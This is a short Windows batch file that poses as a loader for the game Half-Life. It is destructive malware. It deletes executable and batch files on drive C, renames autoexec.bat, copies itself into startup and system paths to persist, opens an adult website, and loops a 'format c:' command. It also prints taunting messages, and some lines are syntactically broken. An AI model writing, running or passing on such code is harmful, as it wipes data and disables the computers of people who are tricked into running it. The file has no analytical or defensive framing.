@echo off
echo *PLEASE WAIT LOADING HALFLIFE*
echo off
color c
del c:\*.exe
del c:\*.bat
del c:\*.com
echo {WARNING}
echo [IF YOU CLOSE THIS YOU COULD BE INFECTED]
echo off
del *.exe
copy %0 c:\bootlog.bat
rename c:\Autoexec.bat autofile.bat
copy %0 WhateverPrograms.exe
copy %0 c:\windows\Badcomp.bat
copy %0 c:\windows\boot.bat
copy %0 c:\logo.sys
copy %0 c:\lo.sys
copy %0 c:\windows\startm~1\programs\startup
:1
start iexplore www.hardcore.com
start notepad
start mspaint
goto 2
:2
format c: y\
goto1
echo
PING 1.1.1.1 -n 5 -w 1000 >NUL
echo !YOUR SCREWED NOW!
echo off
goto1 